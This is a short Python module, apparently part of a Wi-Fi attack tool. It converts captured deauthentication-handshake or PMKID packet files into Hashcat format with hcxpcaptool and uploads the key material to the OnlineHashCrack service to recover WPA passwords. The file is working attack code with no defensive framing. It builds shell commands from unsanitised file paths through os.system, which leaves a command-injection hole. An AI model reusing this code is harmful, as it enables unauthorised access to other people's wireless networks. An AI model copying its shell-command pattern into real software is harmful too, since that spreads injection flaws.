import os
import json
import requests

OHC_URL = 'https://api.onlinehashcrack.com'

# Convert the capture file to Hashcat WPA format
def pcap_to_hccapx(pcap_path):
    pcap_file = pcap_path.split('/')[-1]
    hccapx_file = pcap_file.split('.')[0] + '.hccapx'
    hccapx_path = 'key_material/' + hccapx_file

    # Generate a .hccapx for the 4-way handshake
    if(pcap_file.split('_')[0] == 'deauth'):
        hcxpcaptool_command = 'hcxpcaptool -o ' + hccapx_path + ' ' + pcap_path
        os.system(hcxpcaptool_command + ' > /dev/null')

    # Generate a .hccapx for the PMKID key
    elif(pcap_file.split('_')[0] == 'pmkid'):
        hcxpcaptool_command = 'hcxpcaptool -k ' + hccapx_path + ' ' + pcap_path
        os.system(hcxpcaptool_command + ' > /dev/null')

    # Captured file has key material
    if (os.path.isfile(hccapx_path)):
        print('\nSuccess! Captured key material.')
        print('Converted the captured file into Hashcat format: ' + hccapx_file)
        return True

    else:
        return False

# Call the OnlineHashCrack API
def crack(file, email):
    data = {'email': email}
    payload = {'file': open(file, 'rb')}

    try:
        result = requests.post(OHC_URL, data=data, files=payload)
        print(result.text)
        print('Your hash is being cracked, check your email for updates on the progress...')
        exit()
        
    except requests.exceptions.RequestException as e:
        print('Exception while updating the hashes.')

def start(args):
    if not args.email:
        print('Specify a valid email to send resutls.')
        exit()

    crack(args.file, args.email)
